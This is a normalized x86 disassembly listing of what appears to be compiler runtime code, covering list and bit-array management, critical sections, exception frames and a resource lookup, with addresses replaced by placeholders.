sub_418ea4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ rw-data ]
call sub_418c34
xor edx edx
push ebp
push sub_418f1b
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_418cec
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
call sub_404f70
jmp r-xdata
mov eax [ edi + 0x4 ]
mov edx esi
call sub_419898
mov edx [ ebp - 0x4 ]
call sub_4186d4
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_418f38
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
xor edx edx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
push ebp
push sub_418f98
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_407550
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40db38
call sub_404ec4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418f9f
lea eax [ ebp - 0xc ]
call sub_405530
retn
sub_418fa4
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_418c34
xor eax eax
push ebp
push sub_418fea
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ rw-data ]
call sub_418a94
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418ff1
mov eax [ rw-data ]
call sub_418cec
retn
sub_418ff8
push ebx
push esi
mov esi eax
mov eax esi
call sub_418fa4
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov eax esi
call sub_418f38
sub_419018
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_418c34
xor eax eax
push ebp
push sub_41907d
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_418c58
test al al
je r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_418c40
cmp ebx [ r-xdata ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419084
mov eax [ rw-data ]
call sub_418cec
retn
mov eax ebx
call sub_4045dc
mov ebx eax
sub_419088
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_418c34
xor eax eax
push ebp
push sub_4190ca
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ rw-data ]
call sub_418cf8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4190d1
mov eax [ rw-data ]
call sub_418cec
retn
sub_4190d4
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_418c34
xor eax eax
push ebp
push sub_419116
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ rw-data ]
call sub_418c9c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41911d
mov eax [ rw-data ]
call sub_418cec
retn
sub_419120
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
call sub_418c34
xor eax eax
push ebp
push sub_419167
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
mov edx ebx
mov eax [ rw-data ]
call sub_418b68
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41916e
mov eax [ rw-data ]
call sub_418cec
retn
sub_419174
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_418c34
xor eax eax
push ebp
push sub_4191c2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x4 ] eax
mov edx ebx
mov eax [ rw-data ]
call sub_418930
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4191c9
mov eax [ rw-data ]
call sub_418cec
retn
sub_419228
push ebp
mov ebp esp
test dl dl
je r-xdata
mov [ eax + 0x4 ] ecx
mov ecx [ ebp + 0xc ]
mov [ eax + 0x8 ] ecx
mov ecx [ ebp + 0x8 ]
mov [ eax + 0xc ] ecx
test dl dl
je r-xdata
add esp 0xfffffff0
call sub_404974
pop ebp
retn 0x8
call sub_4049cc
pop [ fs : 0x0 ]
add esp 0xc
sub_419260
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push esi
push edi
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_419228
mov edx eax
mov eax [ rw-data ]
call sub_419b80
pop edi
pop esi
pop ebx
retn
sub_41928c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi eax
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
call sub_419c08
mov esi eax
xor edx edx
push ebp
push sub_4192f6
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_419c6c
retn
mov edx ebx
mov eax esi
call sub_419898
cmp edi [ eax + 0x4 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov eax [ eax + 0x8 ]
mov [ ebp - 0x4 ] eax
call sub_404f70
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_419308
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov edi eax
mov esi [ ebp + 0x8 ]
test esi esi
jl r-xdata
xor eax eax
inc esi
lea ebx [ ecx + 0x4 ]
add ebx 0x8
dec esi
jne r-xdata
mov al 0x1
mov edx [ ebp - 0x4 ]
mov ecx [ ebx - 0x4 ]
mov [ edx ] ecx
jmp r-xdata
mov edx edi
mov eax [ ebx ]
call sub_409a84
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_419348
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi [ ebp + 0x8 ]
test esi esi
jl r-xdata
mov [ ebp - 0x5 ] 0x0
inc esi
mov ebx [ ebp - 0x4 ]
add ebx 0x8
dec esi
jne r-xdata
mov [ ebp - 0x5 ] 0x1
mov eax edi
mov edx [ ebx + 0x4 ]
call sub_405584
jmp r-xdata
cmp eax [ ebx ]
jne r-xdata
movzx eax [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_41938c
push ebx
push esi
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
mov esi ebx
mov edx esi
mov eax [ rw-data ]
call sub_4198f4
test eax eax
jge r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_404620
mov [ rw-data ] eax
pop esi
pop ebx
retn
mov edx esi
mov eax [ rw-data ]
call sub_419740
sub_4193e4
push ebx
push esi
push edi
mov esi eax
xor eax eax
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx [ rw-data ]
mov ebx [ edx + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_419898
mov edi eax
mov eax esi
call edi
test eax eax
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_419424
push ebx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax ebx
call sub_4193e4
test eax eax
sete al
pop ebx
retn
mov eax ebx
call [ rw-data ]
pop ebx
retn
sub_419448
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov edi eax
test ebx ebx
jne r-xdata
push 0xa
mov eax edi
call sub_4059dc
push eax
push ebx
call FindResourceA
test eax eax
setne al
test al al
je r-xdata
mov ebx [ rw-data ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
push edi
push 0xa
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_41c1dc
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4194bc
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ esi ]
mov eax [ ebp - 0x4 ]
call sub_41baa4
mov [ esi ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_404650
retn
sub_4194cc
push ebx
call sub_407688
mov ebx [ eax + 0xc ]
test ebx ebx
jne r-xdata
call sub_407688
mov edx [ eax + 0x8 ]
mov eax ebx
call sub_419740
mov dl 0x1
mov eax [ r-xdata ]
call sub_404620
mov ebx eax
call sub_407688
mov [ eax + 0x8 ] ebx
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_404620
mov ebx eax
call sub_407688
mov [ eax + 0xc ] ebx
sub_419524
push ebx
push esi
push edi
call sub_407688
mov edi [ eax + 0x8 ]
mov ebx [ edi + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_419898
mov edx [ eax ]
call [ edx + 0xc ]
inc esi
dec ebx
jne r-xdata
sub_419554
push ebx
push esi
call sub_407688
mov eax [ eax + 0x8 ]
call sub_404650
call sub_407688
mov ebx [ eax + 0xc ]
mov eax ebx
call sub_419980
mov esi eax
call sub_407688
mov [ eax + 0x8 ] esi
mov edx [ ebx + 0x8 ]
dec edx
mov eax ebx
call sub_41978c
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
call sub_407688
xor edx edx
mov [ eax + 0xc ] edx
mov eax ebx
call sub_404650
sub_4195b0
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
xor edx edx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_419646
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
cmp esi [ r-xdata ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41964d
lea eax [ ebp - 0x4 ]
call sub_405530
retn
mov eax [ ebp + 0x8 ]
cmp esi [ eax - 0x8 ]
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
call sub_4045dc
call sub_4195b0
pop ecx
mov ebx eax
lea edx [ ebp - 0x104 ]
mov eax esi
call sub_404530
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_405794
mov eax [ ebp - 0x4 ]
push eax
mov eax esi
call sub_4069c0
call sub_406a10
mov edx eax
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x4 ]
pop eax
call sub_419448
or bl al
sub_419658
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor eax eax
push ebp
push sub_419706
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x1c ]
and ax [ r-xdata ]
movzx edx [ r-xdata ]
cmp dx ax
sete [ ebp - 0xa ]
cmp [ ebp - 0xa ] 0x0
je r-xdata
xor eax eax
push ebp
push sub_4196e7
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov eax [ ebp - 0x4 ]
call sub_404528
call sub_4195b0
pop ecx
mov [ ebp - 0x9 ] al
cmp [ ebp - 0xa ] 0x0
je r-xdata
call sub_4194cc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4196ee
cmp [ ebp - 0xa ] 0x0
je r-xdata
call sub_419524
retn
call sub_419554
sub_41971e
add [ eax ] al
push ebx
push esi
call sub_404a1c
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x8 ]
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4049c4
sub_419740
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x8 ]
cmp esi [ ebx + 0xc ]
jne r-xdata
mov eax [ ebx + 0x4 ]
mov [ eax + esi * 4 ] edi
inc [ ebx + 0x8 ]
test edi edi
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax esi
pop edi
pop esi
pop ebx
retn
xor ecx ecx
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_41978c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_419824
cmp esi [ ebx + 0x8 ]
jl r-xdata
test edi edi
je r-xdata
sub eax esi
mov ecx eax
add ecx ecx
add ecx ecx
mov eax [ ebx + 0x4 ]
lea edx [ eax + esi * 4 ]
mov eax [ ebx + 0x4 ]
lea eax [ eax + esi * 4 + 0x4 ]
call sub_4030fc
mov eax [ ebx + 0x4 ]
mov edi [ eax + esi * 4 ]
dec [ ebx + 0x8 ]
mov eax [ ebx + 0x8 ]
cmp esi eax
jge r-xdata
pop edi
pop esi
pop ebx
retn
mov cl 0x2
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_4197ec
push ebx
push esi
add esp 0xfffffff8
mov esi ecx
mov ebx edx
call sub_4197e8
push eax
mov [ esp + 0x4 ] esi
mov [ esp + 0x8 ] 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x0
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40db38
jmp sub_404ec4
sub_419824
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi ecx
mov ebx edx
xor eax eax
push ebp
push sub_41986c
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_407550
mov edx [ ebp - 0x4 ]
mov ecx esi
mov eax [ r-xdata ]
call sub_4197ec
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419873
lea eax [ ebp - 0x4 ]
call sub_405530
retn
sub_419898
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_419824
cmp esi [ ebx + 0x8 ]
jl r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax + esi * 4 ]
pop esi
pop ebx
retn
sub_4198c0
mov edx [ eax + 0xc ]
cmp edx 0x40
jle r-xdata
cmp edx 0x8
jle r-xdata
mov ecx edx
test ecx ecx
jns r-xdata
mov ecx 0x4
mov ecx 0x10
jmp r-xdata
sar ecx 0x2
jmp r-xdata
add ecx 0x3
add ecx edx
mov edx ecx
call sub_4199fc
retn
sub_4198f4
push ebx
xor ecx ecx
jmp r-xdata
cmp ecx [ eax + 0x8 ]
jge r-xdata
cmp ecx [ eax + 0x8 ]
jne r-xdata
mov ebx [ eax + 0x4 ]
cmp edx [ ebx + ecx * 4 ]
jne r-xdata
mov eax ecx
pop ebx
retn
or ecx 0xffffffff
inc ecx
sub_419914
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_419824
cmp esi [ ebx + 0x8 ]
jle r-xdata
mov eax [ ebx + 0x8 ]
cmp esi eax
jge r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax [ ebx + 0x8 ]
cmp eax [ ebx + 0xc ]
jne r-xdata
mov eax [ ebx + 0x4 ]
mov [ eax + esi * 4 ] edi
inc [ ebx + 0x8 ]
test edi edi
je r-xdata
sub eax esi
mov ecx eax
add ecx ecx
add ecx ecx
mov eax [ ebx + 0x4 ]
lea edx [ eax + esi * 4 + 0x4 ]
mov eax [ ebx + 0x4 ]
lea eax [ eax + esi * 4 ]
call sub_4030fc
pop edi
pop esi
pop ebx
retn
xor ecx ecx
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_41998c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_419824
cmp esi [ ebx + 0x8 ]
jl r-xdata
pop edi
pop esi
pop ebx
retn
mov [ edx + esi * 4 ] edi
test eax eax
je r-xdata
mov edx [ ebx + 0x4 ]
mov eax [ edx + esi * 4 ]
cmp edi eax
je r-xdata
test edi edi
je r-xdata
mov cl 0x2
mov edx eax
mov eax ebx
mov esi [ eax ]
call [ esi + 0x4 ]
xor ecx ecx
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x4 ]
sub_4199dc
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_4198f4
mov esi eax
test esi esi
jl r-xdata
mov eax esi
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_41978c
sub_4199fc
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x8 ]
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_419824
cmp esi 0x7ffffff
jle r-xdata
pop esi
pop ebx
retn
mov edx esi
add edx edx
add edx edx
lea eax [ ebx + 0x4 ]
call sub_402f34
mov [ ebx + 0xc ] esi
cmp esi [ ebx + 0xc ]
je r-xdata
sub_419a38
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax [ ebx ]
call sub_419824
cmp esi 0x7ffffff
jle r-xdata
mov eax [ ebx + 0x8 ]
cmp esi eax
jle r-xdata
mov edx esi
mov eax ebx
call sub_4199fc
cmp esi [ ebx + 0xc ]
jle r-xdata
mov ebp eax
dec ebp
mov edi esi
sub edi ebp
jg r-xdata
mov edx [ ebx + 0x4 ]
lea edx [ edx + eax * 4 ]
mov ecx esi
sub ecx eax
mov eax ecx
add eax eax
add eax eax
xor ecx ecx
xchg edx eax
call sub_403af4
jmp r-xdata
mov [ ebx + 0x8 ] esi
pop ebp
pop edi
pop esi
pop ebx
retn
dec edi
mov edx ebp
mov eax ebx
call sub_41978c
dec ebp
inc edi
jne r-xdata
sub_419ab0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_404620
lea eax [ esi + 0x8 ]
push eax
call InitializeCriticalSection
mov dl 0x1
mov eax [ r-xdata ]
call sub_404620
mov [ esi + 0x4 ] eax
mov [ esi + 0x20 ] 0x0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_404974
mov eax esi
pop esi
pop ebx
retn
call sub_4049cc
pop [ fs : 0x0 ]
add esp 0xc
sub_419b04
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_404a1c
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_419c08
xor eax eax
push ebp
push sub_419b67
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_404650
movzx edx [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_404640
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419b6e
mov eax [ ebp - 0x4 ]
call sub_419c6c
mov eax [ ebp - 0x4 ]
add eax 0x8
push eax
call DeleteCriticalSection
retn
sub_419b80
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_419c08
xor eax eax
push ebp
push sub_419bfc
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_419740
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_4198f4
inc eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419c03
mov eax [ ebp - 0x4 ]
call sub_419c6c
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x2
jne r-xdata
mov edx [ rw-data ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov eax [ eax ]
mov ecx ebx
call sub_419824
sub_419c1c
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_419c08
xor eax eax
push ebp
push sub_419c5f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_4199dc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419c66
mov eax [ ebp - 0x4 ]
call sub_419c6c
retn
sub_419c78
push ebx
push esi
call sub_404a1c
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_419ccc
mov edx ebx
and dl 0xfc
mov eax esi
call sub_404640
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4049c4
sub_419ccc
push ebx
push esi
push edi
push ebp
push ecx
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x4 ]
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
test esi esi
jge r-xdata
lea eax [ esi + 0x20 ]
dec eax
test eax eax
jns r-xdata
mov eax ebx
call sub_419ca8
sar eax 0x5
mov edi eax
add edi edi
add edi edi
mov eax [ ebx + 0x4 ]
add eax 0x20
dec eax
test eax eax
jns r-xdata
add eax 0x1f
sar eax 0x5
mov ebp eax
add ebp ebp
add ebp ebp
cmp ebp edi
je r-xdata
add eax 0x1f
mov [ ebx + 0x4 ] esi
xor eax eax
mov [ esp ] eax
test edi edi
je r-xdata
test ebp ebp
je r-xdata
mov eax edi
call sub_402f00
mov [ esp ] eax
mov eax [ esp ]
xor ecx ecx
mov edx edi
call sub_403af4
mov eax [ esp ]
mov [ ebx + 0x8 ] eax
cmp [ esp ] 0x0
je r-xdata
mov edx ebp
mov eax [ ebx + 0x8 ]
call sub_402f1c
mov edx edi
mov eax ebp
call sub_419cc0
mov ecx eax
mov edx [ esp ]
mov eax [ ebx + 0x8 ]
call sub_4030fc
sub_419d70
cmp edx [ eax + 0x4 ]
jae r-xdata
cmp edx 0x0
jl sub_419ca8
mov eax [ eax + 0x8 ]
or cl cl
je r-xdata
push eax
push edx
push ecx
inc edx
call sub_419ccc
pop ecx
pop edx
pop eax
jmp r-xdata
btr [ eax ] edx
retn
bts [ eax ] edx
retn
sub_419d9c
push ebx
push esi
push edi
push ecx
mov ebx eax
mov eax [ ebx + 0x4 ]
add eax 0x20
dec eax
test eax eax
jns r-xdata
sar eax 0x5
dec eax
test eax eax
jl r-xdata
add eax 0x1f
mov eax [ ebx + 0x4 ]
inc eax
mov [ esp ] eax
xor esi esi
inc esi
dec [ esp ]
jne r-xdata
mov eax [ ebx + 0x8 ]
mov edi [ eax + esi * 4 ]
xor eax eax
mov eax [ ebx + 0x8 ]
mov edx [ r-xdata ]
cmp edx [ eax + esi * 4 ]
je r-xdata
jb r-xdata
and edx 0x7f
bt edi edx
inc eax
cmp al 0x20
jne r-xdata
mov edx esi
shl edx 0x5
and eax 0x7f
add edx eax
mov eax edx
mov edx [ ebx + 0x4 ]
cmp eax edx
jl r-xdata
mov edx eax
cmp dl 0x1f
ja r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax edx
jmp r-xdata
sub_419e14
push ebx
push esi
call sub_404a1c
mov ebx edx
mov esi eax
mov eax esi
call sub_41c9cc
mov edx ebx
and dl 0xfc
mov eax esi
call sub_404640
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4049c4
sub_419e54
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_419f0a
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4055c8
lea edx [ ebp - 0x104 ]
mov eax [ esi ]
call sub_404530
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_405794
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x114 ] eax
mov [ ebp - 0x110 ] 0xb
lea edx [ ebp - 0x104 ]
mov eax [ ebx ]
call sub_404530
lea eax [ ebp - 0x104 ]
mov [ ebp - 0x10c ] eax
mov [ ebp - 0x108 ] 0x4
lea eax [ ebp - 0x114 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dbf4
call sub_404ec4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419f11
lea eax [ ebp - 0x4 ]
call sub_405530
retn
sub_419f30
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_419fc5
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x104 ]
mov eax [ ebx ]
call sub_404530
lea edx [ ebp - 0x104 ]
mov eax edi
call sub_405794
mov eax ebx
mov si 0xffff
call sub_40484c
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419fcc
lea eax [ ebp - 0x4 ]
call sub_405530
retn
mov eax ebx
mov si 0xffff
call sub_40484c
lea edx [ ebp - 0x4 ]
mov si 0xfffe
call sub_40484c
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push [ ebp - 0x4 ]
push r-xdata
push [ edi ]
mov eax edi
mov edx 0x3
call sub_4058e0
sub_419fd7
inc [ ecx ]
add [ eax ] al
add [ esi ] ch
add [ eax ] al
add [ ebx ] dh
rol bl 0x90
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_4048a4
mov eax ebx
mov si 0xffff
call sub_40484c
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffff
call sub_40484c
push eax
lea eax [ ebx + 0x4 ]
call sub_40700c
mov ecx eax
mov edx r-xdata
pop eax
call sub_404704
sub_41a022
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol [ eax ] 0x0
add [ eax ] al
add [ eax ] al
inc esi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
or eax 0xffffffff
mov eax [ eax + 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
jmp r-xdata
pop ebp
retn 0x4
sub_41a054
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
or eax 0xffffffff
mov eax [ eax + 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x8 ]
jmp r-xdata
pop ebp
retn 0x4
sub_41a074
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_404704
test al al
je r-xdata
mov eax 0x80004002
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0xc
sub_41a09c
push ebx
push ecx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ ebx + 0x4 ]
call [ eax + 0x1c ]
mov [ esp ] eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xc ]
mov eax [ esp ]
pop edx
pop ebx
retn
sub_41a0bc
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor eax eax
push ebp
push sub_41a116
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
cmp [ ebx + 0x8 ] 0x0
jg r-xdata
mov eax ebx
call sub_419980
call sub_404650
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
retn
sub_41a124
push ebx
push esi
call sub_404a1c
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41acb0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_419e14
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4049c4
sub_41a154
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
mov ecx edi
mov edx esi
mov eax ebx
